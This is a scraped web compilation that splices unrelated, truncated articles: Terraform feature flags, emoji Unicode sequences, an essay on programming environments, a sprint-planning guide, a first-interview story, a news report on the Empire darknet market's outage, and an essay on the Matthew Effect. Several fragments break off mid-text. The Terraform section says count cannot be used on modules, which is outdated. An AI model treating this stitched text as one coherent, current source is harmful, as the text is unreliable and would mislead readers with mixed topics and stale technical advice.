<p>Next, you can use the new feature flag as a condition to determine whether to deploy certain resources defined within the Terraform project. However, Terraform does not contain a sort of <code>provision = local.provision_b59func</code> syntax. Instead, you need to use the <code>count</code> parameter on the Terraform resource. Then with the <code>count</code> parameter, you can use a condition to tell Terraform conditionally provision either <code>1</code> or <code>0</code> of the declared resource based on the feature flag variable.</p>



<p>Here’s an example of adding the <code>count</code> parameter on a Terraform resource to conditionally declare to provision the resource based on the feature flag.</p>



<pre><code>resource "azurerm_function_app" "b59func" {
  # Conditionally based on feature flag
  count = local.provision_b59func == true ? 1 : 0
  # If 'true', provision 1 of this resource
  # If 'false', don't provision this

  [...]
}</code></pre>



<p>With the <code>count</code> parameter, the condition can be configured to check if the feature flag is <code>true</code> and set the <code>count</code> to <code>1</code> for provisioning the resource. Then, also, when the feature flag is set to <code>false</code> the Terraform will be declared to skip provisioning the resource by setting the <code>count</code> to <code>0</code> (zero).</p>



<h3><span id="module_feature_flags"></span>Module Feature Flags<span></span></h3>



<p>When building out a Terraform IaC project, you can break out your Terraform code into <strong>modules</strong>. This essentially allows you to group multiple Terraform resources into a reusable block of HCL code. You can also think of a Terraform module as a function or method of Terraform code; to borrow terms from software development.</p>



<p>To implement Terraform modules, you will place the Terraform code (<code>.tf</code>) files within a sub-folder or separate folder. Then to reuse the module within you Terraform code, you declare a Terraform <code>module</code> block and use the <code>source</code> argument to tell Terraform where to find the <code>.tf</code> code files that declare the Terraform resources to be deployed for the module.</p>



<p>Here’s an example folder structure for a really simple Terraform project with a module define within the <code>modules/azure-function</code> sub-folder:</p>



<pre><code>Example Terraform Project w/ Module
|-- deploy.tf
|-- modules
    |-- azure-function
        |-- deploy.tf
</code></pre>



<p>In this example, the Terraform project has a single <code>deploy.tf</code> file for simplicity. Most Terraform projects will be comprised of multiple <code>.tf</code> files. Then the <code>modules</code> subfolder is used to contain any additional modules defined within the project. This example shows the <code>modules/azure-function</code> subfolder to define a module for deploying one or more resources as a reusable block of Terraform code.</p>



<p>The <code>modules/azure-function</code> module folder contains the Terraform code for this module. This code will contain all the Terraform code to declare one or more resources this module will be used to deploy and manage. In order to support a feature flag to be passed into the module, the Terraform code will also need to declare a variable to be passed in.</p>



<p>The feature flag value will be passed into the module by declaring an input <code>variable</code> for the module. This will allow the consuming Terraform project to pass in the desired feature flag value to conditionally deploy resources declared within the module.</p>



<p>Here’s a short example for some Terraform code that could be contained within the example <code>module/azure-function</code> module. Notice the code includes a similar condition on the resources based on the feature flag using the <code>count</code> argument, in addition to the <code>variable</code> declaration for the <code>to_provision</code> feature flag of type <code>bool</code> to accept the feature flag.</p>



<pre><code># Terraform Module: /modules/azure-function/deploy.tf
variable "to_provision" {
  type    = bool
  default = true
}
resource "azurerm_function_app" "b59func" {
  # Conditionally based on feature flag
  count = var.to_provision == true ? 1 : 0
  # If 'true', provision 1 of this resource
  # If 'false', don't provision this

  [...]
}
resource "azurerm_storage_account" "b59storage" {
  # Conditionally based on feature flag
  count = var.to_provision == true ? 1 : 0
  # If 'true', provision 1 of this resource
  # If 'false', don't provision this

  [...]
}</code></pre>



<p>Next, to consume and utilize the module within the main Terraform project, a <code>module</code> block is declared using the <code>source</code> argument to tell Terraform what folder contains the source code for the module being used.</p>



<pre><code>locals {
  provision_b59func = true
}

module "b59func" {
  source = "modules/azure-function"

  to_provision = local.provision_b59func
}</code></pre>



<p>The <code>module</code> block does not use the <code>count</code> argument directly. This may be supported in future versions of Terraform, but at this time <code>count</code> is not supported on modules. As a result, you’ll need to declare an input variable on the module that will be used to pass in the feature flag value with the deployment conditions implemented within the modules code.</p>



<h3><span id="organize_feature_flags_within_locals"></span>Organize Feature Flags within <code>locals</code><span></span></h3>



<p>When implementing multiple feature flags within the same Terraform project, it can help to organize them within a group. You can optionally create a <code>local</code> variable that is an object map with individual properties within the object for each feature flag.</p>



<p>Here’s an example of declaring a <code>local.feature_flags</code> variable to …</p></div></div>

Hopefully someone out there will find this information useful, or at least interesting.</p>
<p>Emojis are everywhere nowadays - SMS messages, Slack messages, even Git commit messages! But what makes these little smileys (and other icons) work?</p>
<h2 id="a-little-history">📜 A little history</h2>
<p>Emojis were predated by so-called "emoticons". These were sequences of characters that resembled faces with different expression, such as <code>:-)</code> for a smiley face. The emoticon first originated in electronic communications by Scott Fahlman on September 19, 1982, but their usage in printed text pre-dates even that. As early as the late 1800s (and possibly even earlier), sequences of print characters were proposed to represent different emotions.</p>
<p>There are several claims as to who invented the first graphical emoji characters, but they originally grew in popularity in Japan. Cell phone manufacturers began work to introduce their own emoji sets in the early 2000s.</p>
<p>Unicode is an industry standard for encoding of text. During the 2000s, Unicode gradually added emoji characters. Later that decade, it was suggested that Unicode consider creating a standard set of emojis that could be used across different platforms. Then, in 2009, the Unicode Technical Committee produced a proposed Unicode Emoji standard. Unicode 6.0 was the first version with a uniform set emojis.</p>
<h2 id="what-makes-an-emoji">⚙️ What makes an emoji?</h2>
<p>Under the hood, emojis are just sequences of Unicode code points. For example, the "face with tears of joy" emoji (😂) is the code point <code>U+1F602</code>. The most basic emojis are single Unicode code points.</p>
<h2 id="why-do-emojis-look-different-on-different-operating-systems">🎨 Why do emojis look different on different operating systems?</h2>
<p>The Emoji standard defines what code point sequences stand for what emojis, but doesn't dictate how they should look. Each operating system vendor creates their own images for these emoji characters and puts them all into the system font as glyphs.</p>
<h2 id="skin-tone-variations">👍🏼 Skin tone variations</h2>
<p>Unicode 8.0 added support for skin tone variations on human emojis. This is supported via a set of five modifiers based on the <a target="_blank" href="https://en.wikipedia.org/wiki/Fitzpatrick_scale">Fizpatrick scale</a> for measuring human skin color. These modifiers are themselves also Unicode code points, starting at <code>U+1F3FB</code> and ending at <code>U+1F3FF</code>.</p>
<p>To create a skin tone variant of an emoji, a sequence is used consisting of the main emoji code point followed by the skin tone modifier. So for example, a dark skinned thumbs-up emoji (👍🏿) would be represented by the sequence <code>U+1F44D U+1F3FF</code>.</p>
<h2 id="complex-emoji-sequences">👨‍🚀 Complex emoji sequences</h2>
<p>Some emojis don't have a single code point, but rather are expressed as sequences of other emoji code points - compound emojis, if you will. Here's an example: the male astronaut emoji (👨‍🚀). This is actually a combination of the man emoji (👨, <code>U+1F468</code>) and the rocket emoji (🚀, <code>U+1F680</code>).</p>
<p>But how does the system distinguish between an astronaut and a man followed by a rocket?</p>
<p>Enter the Zero Width Joiner (ZWJ).</p>
<p>The ZWJ, sometimes pronounced "zwidge", is not an emoji itself but is used in emoji sequences. Its code point is <code>U+200D</code>. It is an invisible character with, as its name implies, zero width.</p>
<p>The ZWJ is used as glue to attach different emoji code points together to create compound emoji sequences. Going back to our example of the male astronaut emoji, the sequence for this emoji would be <code>U+1F468 U+200D U+1F680</code>.</p>
<p>This can even be combined with a skin tone modifier to create a medium-skinned male astronaut (👨🏽‍🚀): <code>U+1F468 U+1F3FD U+200D U+1F680</code>. Note that the skin tone modifier, <code>U+1F3FD</code>, does not use a ZWJ. </p>
<h2 id="variation-selector-16">👁‍🗨 Variation Selector 16</h2>
<p>There is another special emoji code point, called Variation Selector 16, with a code point of <code>U+FE0F</code>. Some emojis also have a plain text presentation, which means they usually appear as a solid shape. For example, the heart emoji (❤️) has a plain text presentation (❤).</p>
<p>By default, these emojis will appear with the plain text presentation. The heart emoji code point is <code>U+2764</code>. This code point alone will result in the solid heart (❤).</p>
<p>To display these characters as their colorful emoji presentation, they are followed by Variation Selector 16. So to get the red heart, you would use the sequence <code>U+2764 U+FE0F</code>.</p>
<p>Some emoji sequences can have one (or more!) ZWJs and Variation Selector 16 characters. Take the example of the "eye in speech bubble" emoji (👁‍🗨). This is a complex sequence, <code>U+1F441 U+FE0F‍ U+200D U+1F5E8 U+FE0F</code>:</p>
<ul>
<li><code>U+1F441</code> eye</li>
<li><code>U+FE0F</code> Variation Selector 16</li>
<li><code>‍U+200D</code> Zero Width Joiner</li>
<li><code>U+1F5E8</code> left speech bubble</li>
<li><code>U+FE0F</code> Variation Selector 16</li>
</ul>
<h2 id="wrapping-up">🖖 Wrapping up</h2>
<p>There are some further emoji topics - additional modifiers, fully qualified vs. unqualified sequences, and more, but in the interests of time I won't cover those here. Maybe in a future post!</p>
<p>I hope you found this informative and that you learned something new about emojis! Think about this complexity the next time you send an emoji in a text message.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>It’s common to talk about the way we build software in terms of the individual tools we compose together, like command-line utilities and deployment pipelines and containers and services, and most obviously, <em>programming languages</em>. Programming languages seem to get the highest level of scrutiny out of everything that comprises the way we write software. And in the last decade, I think we’ve seen a healthy rejuvenation of innovation in programming languages, driven by languages like Rust, Go, OCaml, Zig, and Swift that bring new ideas to the industrial programming world in practical packages.</p>
<p>But while programming languages are academically interesting, I think <strong>we more desperately need innovation in programming <em>environments</em></strong>.</p>
<p>The programming <em>environment</em> isn’t a single component of our workflow, but the total sum enabled by the tools working together harmoniously. The environment contains the programming language, but also includes the debugging experience, dependency management, how we communicate with other developers (both within source code and without), how we trace and observe code in production, and everything else in the process of designing APIs to recovering from failure.</p>
<p>The story of programming language evolution is also a story of rising ideas in what capabilities good programming <em>environments</em> should grant developers. Many languages came to popularity not necessarily based on their merits as great languages, but because they were paired with some new and powerful capability to understand software and write better implementations of it.</p>
<p>C brought practical portability to (what was at the time) high level programs. C literally elevated the programming environment out of processor-specific assembly code into a common vernacular. The legacy is so strong that most languages we use in production today are either direct descendants of C, or inherit much of their syntax, like curly brace-delineated blocks and structures, semicolon statement-terminators, and parenthesized function calls.</p>
<p>JavaScript is popular outside of the browser almost entirely on the merit of its ecosystem, its tooling, and the trivial debugging experience enabled by the repl. JavaScript’s programming environment is entirely interactive, visual, and real-time, without the need for clunky debugging apparatuses. The impact of that interactivity is obvious in the fact that many of my developer friends started programming on the Web, explicitly because it was the easiest way to write programs that produced output we could see and share.</p>
<p>One of Go’s claims to fame and primary design goals is compilation speed. Compared to its predecessor C++, Go compiles fast. And when you make something fast, people start to use it differently.</p>
<p>Erlang, with its <a href="https://www.erlang.org/">advanced, concurrent, message-passing runtime</a>, offers a better way to build high availability, highly reliable systems. It was born in the telecom industry, but has found home in many other critical services industries.</p>
<p>Thoughtfully crafted programming environments are the hidden treasures of the software industry. When we choose a language because of the “tooling” or because of the “IDE experience” or because of “the workflow,” what we are really doing is making a judgement about the programming <em>environment</em> we want to live in and grow around our work.</p>
<p>Between investments being made into new languages and the community’s willingness to experiment, there’s a lot of creative energy being poured into inventing better languages. I think it would serve us well if we invested just as deeply into rethinking the context in which we write those programs. We should be asking questions like:</p>
<ul>
<li>While professional photo editors and video games can run in the browser, why are we still using a repl that prints lines in the terminal?</li>
<li>Does the compile-time / run-time distinction make sense to have? Can we give better control to developers about when their code is executed during the software development and deployment process?</li>
<li>What does an operating system kernel designed for debugging experience look like?</li>
<li>What does a memory model or memory allocator designed for debugging experience look like?</li>
<li>Are the tools we have today good enough foundations for massive open-source communities like NPM? How can we improve the programming environment and our tools to make the most of package repositories with hundreds of millions of libraries and billions of lines of code?</li>
</ul>
<p>There are some people trying to create better programming environments. <a href="https://repl.it/">Repl.it</a> brings general purpose development to the browser. Experiments like <a href="http://lighttable.com/">Light Table</a> more closely integrate source code with its output. Jupyter notebooks are a unique way of writing and sharing code that focus on the process of iteration.</p>
<p>But these are also workflows and tools built around languages that were never designed for such interactive experiences. I think if we build a culture of thinking about programming environments as a place ripe for creative innovation, we’ll see a new class of software development tools emerge that make the most of today’s machines and networks and allow us to write new kinds of software we couldn’t before.</p>

                    <p>Few things are as crucial as running a well-executed sprint planning meeting.</p><p>Get it right and you’ll be on your way to shipping quality software. Get it wrong, and it'll snowball into a giant mess.</p><!--kg-card-begin: markdown--><p>In product development, the definition of success is vague. Inefficiencies are invisible. But failures are apparent.</p>
<p><mark><strong>Development workflows in businesses are ridden with inefficiencies due to misalignment of teams, tools, and processes.</strong></mark> And running an effective sprint planning meeting can be your first step to streamlining your development process.</p>
<!--kg-card-end: markdown--><p>But more than that, a <a href="https://zepel.io/agile/scrum/sprint-planning/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=sprint-planning-template">sprint planning</a> <a href="https://zepel.io/agile/scrum/scrum-ceremonies/">ceremony</a> is critical because it aligns the development team with the product owner. Much like all relationships, the one between you and your team requires communication and clarity.</p><p>And what better way to take the time to sit down and ensure the expectations are understood and can be done by your team?</p><p>This article will walk you through 5 steps you can follow every time you run a sprint planning meeting. It’s the only template you’ll ever need.</p><!--kg-card-begin: html--><!--kg-card-end: html--><!--kg-card-begin: html--><!--kg-card-end: html--><!--kg-card-begin: html--><h2 id="step1">Step 1: Mind the roadmap</h2><!--kg-card-end: html--><p>The best way to make sure your sprint is successful is by not thinking only about your sprint, but about your product as a whole!</p><p>This, of course, is easier said than done. As a product manager, you’re tasked with keeping track of the micro-level changes that your team makes (think tasks and user stories) and connecting it with the macro-level goals you need to accomplish (think, product roadmap and vision).</p><!--kg-card-begin: markdown--><p><mark><strong>How do you zoom in, zoom out, and make sense of all the updates from design, development, and QA teams? How do you do it when all their work is split between sticky notes, simple task lists, and inside GitHub?</strong></mark></p>
<!--kg-card-end: markdown--><p>The key is to ask yourself some serious questions:</p><ul><li>Is your roadmap of features derived from a product strategy that moves the needle?</li><li>Are you reacting to loud customers? Or are you prioritizing the right features?</li><li>As your team completes multiple sprints, how is it affecting your entire roadmap?</li></ul><p>There are always too many features you can build. But as a product manager, it’s <a href="https://www.mindtheproduct.com/a-product-managers-guide-to-saying-no/">your job to say no</a>. If you want to build a product that stands out, you’ll have to make sure what your team is building today will take your product to where you want to be at the end of this quarter, 6 months, or a year later.</p><p>Zepel offers a unique way for you to plan your roadmap and keep track of its progress effortlessly, even as members from multiple teams make changes and progress.</p><figure><img src="https://zepel.io/blog/content/images/2020/03/sprint-planning-roadmap.png" alt="Get a quick overview of the roadmap and track progress with Kanban view of all features"><figcaption>Get a quick overview of the roadmap and track its progress</figcaption></figure><!--kg-card-begin: html--><h2 id="step2">Step 2: Have an updated list of user stories before the sprint planning meeting</h2><!--kg-card-end: html--><p>In a perfect, simple world, your team can pick up the <a href="https://zepel.io/agile/user-stories/">user stories</a> you wrote a month ago and start working on them immediately. In reality, that’s rarely the case.</p><p>Since the last time you wrote the user stories, your customers would’ve asked for several functionalities to be added to your feature and their usage within your product would’ve changed. You’ll have to factor in all these variables and changes into your user stories and ensure they are updated before you walk into the sprint planning meeting.</p><p>Now, the question most teams have is “<em>how many user stories should you update?</em>” The ideal case is to have all of them updated. But in reality, that’s an impossible task unless your product is relatively new and small.</p><figure><img src="https://zepel.io/blog/content/images/2020/03/updated-list-of-user-stories-for-sprint-planning.png" alt="A list of user stories, tasks, subtasks, bugs, and enhancements"><figcaption>A list of user stories</figcaption></figure><p>The best practice is to have enough user stories updated to plan the next two sprints. That way, you’ll have the context of what the sprint is building towards — ideally, towards hitting the roadmap goals you reviewed in the previous step.</p><p>If you’re using <a href="https://zepel.io/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=sprint-planning-template">Zepel</a>, you can quickly add more details to your user story by adding detailed <a href="https://zepel.io/agile/user-stories/acceptance-criteria/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=sprint-planning-template">acceptance criteria</a>, attachments, and comments. That way, when you bring your teammates, everyone has the full picture of what each user story tries to achieve and everyone is on the same page.</p><figure><img src="https://zepel.io/blog/content/images/2020/03/user-story-with-descriptions-1.png" alt="An updated user story with descriptions, comments, and attachements"><figcaption>An updated user story with description, comments, and attachments</figcaption></figure><!--kg-card-begin: html--><h2 id="step3">Step 3: Estimate user stories and tasks</h2><!--kg-card-end: html--><p>Now that you’ve updated your user stories, it’s time to bring in your development team and estimate how long it would take to complete each of these user stories you updated. Estimating accurately is one of the hardest things to do.</p><p>Of course, not every user story will be hard to estimate. We’ve noticed things we have experience with are much easier to estimate. A huge reason for this is the fact that our team is already equipped with the working knowledge and the intricacies involved in building it.</p><p>When working on things we don’t have previous experience with, we make sure we break the user story down into subtasks and estimate each of those subtasks. Once we break the user story down, we take a step back and look at all the tasks. Often, we notice there are a bunch of work that we can start working on immediately, few that look vague, and a couple that look as mysterious as the dark side of the moon.</p><p>We group each of them into three categories — known, partially known, and unknown — and work our way to finding more information about them.</p><!--kg-card-begin: markdown--><p><img src="https://zepel.io/blog/content/images/2018/09/types-of-tasks-during-estimation-4.png" alt="Break down user stories to subtask for better estimation"></p>
<!--kg-card-end: markdown--><blockquote>When you haven’t thought about what you’re going to do, you can’t know how long it will take.<br>~ Joel Spolsky, CEO of Stack Overflow</blockquote><p>We’ve written a beginner’s guide to estimate a user story with story points <a href="https://zepel.io/agile/scrum/story-points/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=sprint-planning-template">over here</a>. And shared some best practices you should follow <a href="https://zepel.io/blog/project-estimation/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=sprint-planning-template">over here</a>.</p><!--kg-card-begin: html--><h2 id="step4">Step 4: Come up with a clear sprint goal</h2><!--kg-card-end: html--><p>With all user stories updated and estimated, as a product manager everything should slowly start to make sense like an M. Night Shyamalan movie.</p><p>While you might have an initial objective in mind for the sprint, coming up with a sprint goal is a collaborative effort. A sprint goal, simply put, is what you would’ve delivered at the end of the sprint. They’re a great way to get your team to rally around a common goal and keep them motivated.</p><p>An example of a sprint goal may look like this: “<em>Develop the checkout process for the store</em>”.</p><p>But before you even begin discussing what the goal of the sprint should be, make sure that you’re setting the right expectations for the sprint depending on the sprint duration. That means, understanding your team’s capability, factoring in unforeseen delays, and setting aside some time for bug fixes, code reviews, and optimizations.</p><p>As we get deeper into running a sprint planning meeting you need to remember:</p><blockquote>Your sprint goal intersects with your customer’s problem at a specific touchpoint. The software you deliver at this intersection is another opportunity to “wow” them and gain their loyalty.</blockquote><!--kg-card-begin: html--><h2 id="step5">Step 5: Collaboratively plan a sprint backlog</h2><!--kg-card-end: html--><p>With a sprint goal in place, it’s time to talk about “how” you’re going to achieve it.</p><p>This is a collection of multiple user stories you updated and estimated in the previous steps. The difficulty is identifying a list of user stories, tasks, and bugs that will help you achieve the goal and can be completed within the sprint duration.</p><p>It’s essential the team collectively selects the sprint items and size of the <a href="https://zepel.io/agile/scrum/backlog/">sprint backlog</a>. Since they’re the people committing to completing the items, they must also be the ones to choose what they are committing to.</p><blockquote>When you involve your team in the sprint planning process, you don’t have to run behind them every other day asking for updates. Because they’re motivated by a far greater power — extreme ownership.</blockquote><p>Of course, once your sprint backlog is finalized, make sure you assign, set due dates, and share all the assets your team needs to do their best work.</p><!--kg-card-begin: html--><h2 id="points">Key points to remember during the sprint planning meeting</h2><!--kg-card-end: html--><ol><li>The sprint planning meeting is a collaborative effort.</li><li>According to scrum guide, the sprint planning meeting should be time boxed to 8 hours for a sprint that’s 1 month long.</li><li>As a product manager, be sure to discuss and specify acceptance criteria for each user story.</li></ol><!--kg-card-begin: html--><h2 id="template">Get the Sprint planning template: So you can streamline the entire process!</h2><!--kg-card-end: html--><p>Here’s a sprint planning template you can use that uses all the best practices we discussed above. </p><!--kg-card-begin: html--><!--kg-card-end: html--><p>A sprint planning template should enable teams to get a quick overview of what's planned for the upcoming sprint along with its details.</p><figure><img src="https://zepel.io/blog/content/images/2020/03/sprint-planning-template.png" alt="A template of a sprint plan in progress"><figcaption>A template of a sprint plan in progress</figcaption></figure><p>A template should include the following 6 parts to help teams effectively plan their sprint:</p><ol><li><strong>The sprint name:</strong> This helps teams understand the goal of the sprint.</li><li><strong>An overview of the sprint:</strong> This includes its duration, status, number of open items, estimates remaining, and a completed percentage.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1594733894583/HtuWynirv.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>I was really scared about my first interview and I can't blame myself because I was about to go through a phase that almost every adult has to go through. </p>
<p>This article is inspired by <a target="_blank" rel="noopener noreferrer" href="https://hashnode.com/">Hashnode's weekly challenge</a> to encourage developers to share their first interview experience and lessons learned from it.</p>
<p>Now let's get to it 👩‍💻. </p>
<h2 id="before-the-interview">Before The Interview</h2>
<p>Of course, the first thing I had to do was to apply for the job because you can't go for a job interview if you don't apply for the job right😃.</p>
<h3 id="so-how-did-i-find-the-job-role-">So how did I find the job role?</h3>
<p>I read a post about the job in a Google Developer Group forum and even though I knew I wasn't qualified for the role, I still sent in an application because I was already prepared for the worse that could happen. </p>
<p>I thought about it and figured out that the worse thing that could've happened is either not getting a response from the recruiter or getting a response that I didn't have the necessary skills. Yes, that would've been sad but I gave it my best shot.</p>
<p>And guess what? They took a chance on me for some reason and invited me over for an interview.</p>
<p><img src="https://media.giphy.com/media/h8UyZ6FiT0ptC/giphy.gif" alt="happy gif"></p>
<p>Honestly, I was shocked when I received an email about the invitation because I didn't have prior experience as a Software Developer in any company even though I was quite active in the developer community. </p>
<p>As excited as I was, I knew I had to brush up on my skills immediately so I went to the place where I could find answers to almost all the questions on earth - <em>Google.</em> I started googling questions like "what should I expect, 10 things the interviewer will ask during the interview, etc". </p>
<h2 id="the-interview">The Interview</h2>
<p>On the day of the interview, I woke up, showered, and went into the streets of Lagos, Nigeria. If you've ever heard of Lagos then you must've heard about the traffic as well.</p>
<p>I knew that day wasn't going to be one of those days where I get stuck in traffic and miss an opportunity so I left the house 2 hours before the scheduled time. You might not believe this but, I didn't reach the company as early as I imagined because of the traffic. </p>
<p><img src="https://media.giphy.com/media/xUA7b7pLM4w1edn0yI/giphy.gif" alt="tired gif"></p>
<p>I was really tensed. My heart rate increased tremendously and I was literally sweating all through. As I sat down smiling at almost every person that passed, I was going through everything I had studied and wondered what I was going to do if I was asked about something I knew nothing about.</p>
<p>The recruiter eventually asked me to come inside the office for the interview. I became a bit calm when I noticed they seemed like really friendly people.  Well, maybe it was because I was smiling a lot. If I remember correctly, they asked questions around the OOP, parameters, MVC, etc. </p>
<p>Obviously, I couldn't answer all the questions but the few I answered got me into the next round of the interview which was working on a project for some days. Prior to when I was given that project, I had never worked on something like that before but I knew I had to study, work on the project, and send it to them.</p>
<p>They reviewed the project, liked it, and sent me an invitation to meet the HR of the team. This phase didn't seem scary to me because I knew it was easy for me to connect with people. </p>
<p>As I imagined, it went pretty well with the HR team. They were impressed about my tech journey and my ability to code as a woman.  </p>
<p>A few weeks later, I got an offer to join the company💃.</p>
<h2 id="what-did-i-learn-">What did I learn?</h2>
<ul>
<li>You don't that have to meet the entire qualifications stipulated in the job description before applying for a role. For instance, it was my very first interview but I was still offered the job because I showed them I was willing to learn on the job. </li>
<li>You have to be very polite and joyful because employers don't just care about your skills, they also care about your personality and ability to work in a team. </li>
<li>It is important, to tell the truth about things you don't know. There is honestly no shame in saying 'I don't know this' or 'I have forgotten about it'.</li>
<li>It is important to show the employer that you are willing to learn on the job if you don't have the required skills during the interview.</li>
<li>Joining a developer community is a catalyst for growth. </li>
</ul>
<p> You should join this week's <a target="_blank" rel="noopener noreferrer" href="https://hashnode.com/n/myfirstinterviewexperience">#MyFirstInterviewExperience</a> challenge by Hashnode. I will love to read about your interview experience as well.  </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Empire Market Down for Over 100 Hours Sparkling Fear of Exit Scam or DDoS Attack</h3><p><label>Empire market has experienced an outage said to be the longest ever shutdown<br>
since 2019. According to multiple reports, the market has been offline for over 100<br>
hours now, sparkling fear of a possible exit scam just like the Wall Street Market in<br>
2019. A section of the market users also rules out exit scam possibility, linking the<br>
long shut down of its servers to a DDoS attack which is very common in the market.<br>
In fact, others have also hinted that the Empire market administrators have<br>
transferred a huge sum of Bitcoins into a different wallet address in the midst of the<br>
chaos.<p>

It all started when empire market users encountered unusual difficulties accessing<br>
the site. From the many tweets and posts on Twitter and Dreads, it was obvious that<br>
the initial thought was a possible DDoS attack in which the Endgame DDoS filter<br>
failed to stand. Soon after, an Empire Staff appeared on Dread to post a valid PGP<br>
signed update confirming the speculated DDoS attack. This brought some hope to<br>
users who had money in escrow thinking everything would be sorted out for the site<br>
to run without problems.</p><p>

It was reported that the Monero functionality of the website was not working properly,<br>
however, the Bitcoin deposit and withdrawal were working perfectly though hard to<br>
access. The mysterious disappearance of the Empire market did not follow the<br>
usual process of most of the websites that pulled exit scams, and so people kept<br>
their hope alive for a while. Most sites disable withdrawal and allow deposit for a<br>
while before pulling an exit scam. This was not the case of the Empire market.</p><p>

A few days after the initial report, users began reporting on various forums that the<br>
Empire market’s public and private URLs are offline for the first time since the<br>
DDoS attack was reported. An Empire market staff once again posted a valid PGP<br>
signed update on Dread, asking people to ignore the false narratives and FUD circulating.</p><p>

According to his post, anything being safely done takes time. A lot of references<br>
were made users on the shut down of previous dark web markets as the FBI uses<br>
DDoS attacks to identify and arrest administrators. A typical example is the 2013<br>
Drama of the fall of the old silk road market when it was initially published that the<br>
site was undergoing a DDoS attack but never came back.</p><p>

Se7en, the head of moderator for Empire market has hit the final nail on the coffin<br>
stating that the empire market will not return. According to him, the administrators<br>
took the website down completely including the mod. panel. He expressed his<br>
disappointment in the way the market exited and even apologized to anyone who<br>
had money in escrow. Se7en shifted the blame on the tor project and DDoS<br>
attackers. The market truly experienced a DDoS attack, however, the market was<br>
being held by multiple DDoS attackers. During the time when they were considering<br>
paying the DDoSer, a new DDoS was launched on the site coming from a different<br>
attacker and capable of taking down 9 Endgame links. This was when the<br>
administrators probably thought of taking down the market. Since the site was taken<br>
down, there has not been any announcement from the FBI or the popping up of prior<br>
notice by the administrators making it reasonable to call it an exit scam.</p><p>

<img src="https://cdn.onion.live/public/upload/image/884d5dbe957bf4e8daac4789eb1ff6d4.png"></p><p>

According to the Chief Executive Officer of Intel 471 INC. Mark Arena as reported<br>
by <a href="https://www.bloomberg.com/news/articles/2020-08-26/popular-dark-web-drug-marketplace-suddenly-goes-offline/">Bloomberg</a>, the running of a dark web markets lead the administrators to one of<br>
the two possible outcomes – be arrested by law enforcement or stage an exit scam.<br>
The threat researcher at a cybersecurity company Digital Shadow L.T.D, Kacey<br>
Clark has also said that the dark web markets mostly host vendors who keep a lot of<br>
money on the platform due to their day to day transactions.</p><p>

Vendors mostly do this on platforms that have operated for long and well<br>
established. In this case, Arena estimates that the administrators went away with a<br>
single-digit million at least. Bloomberg reported that the FBI has declined to<br>
comment on the issue. There is no indication of FBI notice on the site as it happens<br>
with most of the seized platforms. The Empire market is completely offline. Fears<br>
have arisen among the various dark web market users as one more established<br>
black market has joined the list of markets that pulled exit scams. In 2016, the<br>
Evolution market vanished without notice, taking away $12 million in Bitcoin held by<br>
vendors in escrow.</p></label></p></div><div><p>

<h2>Life is better than it was 50 years ago, but there are still people that suffer. What are they missing?</h2>



<p><strong>The Matthew Effect is a popular saying simplified as: the rich get richer, while the poor get poorer.</strong> To break this cycle, disadvantaged communities need to band together in multigenerational homes. In doing so, they can benefit from pooling resources, sharing costs and investment risks, and adopting a generational planning mindset. </p>



<h2>What Causes The Matthew Effect?</h2>



<p>On a narrow timeline the Matthew Effect is true, but if you look back over the last 50 years, life most certainly is better now than it was then. </p>



<p>In general, the quality of life has improved for society as a whole. We have better medicine, better access to information, and better opportunities for personal growth. As a consequence, it’s better to live today than in the past. So why is there a discrepancy in the feeling of every day people? </p>



<p>It boils down to this: life is better now because of societal level benefits that everyone receives but when we compare individuals, the results diverge. Aside from the causes creating the <a href="https://dougantin.com/2020/08/07/a-new-social-class-is-made-out-of-remote-work-why-you-care/">newly forming class divide</a>, it’s a challenge of both relativistic comparison and of accumulated advantage. Ie: When you have less than your rich neighbor, it’s gonna seem as though he gets more rich while you struggle along paycheck to paycheck. </p>



<h2>Accumulated Advantage – It Pays To Start With More</h2>



<p>The country you’re born in and your family’s financial circumstances when you start life greatly impacts your longterm success. That’s because accumulated advantage is a function of compound interest. Each subsequent generation that follows you will compound on the benefits from the preceding generation. </p>



<p>The more of an advantage you begin life with and the more frequently you add to that starting position, the greater the compound value will be. Starting from a position of financial strength empowers long term decision making. You can afford to defer financial results and incur losses when pursuing high value opportunities. Whereas living paycheck to paycheck forces short term choices at the expense of long term gains. </p>



<p>Comparing decisions based on generational accumulated advantage to short term disadvantaged decision making is like comparing compound interest to simple interest. </p>



<figure><a href="https://www.fool.com/knowledge-center/compound-interest.aspx"><img src="https://g.foolcdn.com/image/?url=https%3A%2F%2Fg.foolcdn.com%2Feditorial%2Fimages%2F198150%2Fwiki-chart.png&amp;w=700&amp;op=resize" alt="" data-lazy-src="https://g.foolcdn.com/image/?url=https%3A%2F%2Fg.foolcdn.com%2Feditorial%2Fimages%2F198150%2Fwiki-chart.png&amp;w=700&amp;op=resize&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure>



<p>The velocity of change is considerably different. And this is what creates the feeling that the The Matthew Effect is real. </p>



<p>Our societal level educational systems don’t train students to seek long term accumulated advantage. We don’t have a standardized curriculum of generational wealth building strategies. Instead, it falls on the individual to take standard skills and rise to the top. A frequently ineffective trial by fire. </p>



<h2>The Most Important Attributes of Accumulated Advantage</h2>



<p>Accumulated Advantage is best thought of as the effect produced from compound interest. ie: each generational improvement adds to the principle of all previous societal advances with the addition of all past advances. </p>

<p>So if you consider accumulate advantage is like compound interest, you can use the formula to figure out ways to improve life.  Your starting point is therefore the major coefficient in determining your outcome. As previously said, the larger your starting point is the better off you’ll be. But you can also increase your principle with greater speed by manipulating the other elements of the equation. </p>



<h3>Start Earlier and Increase Frequency of Contribution</h3>



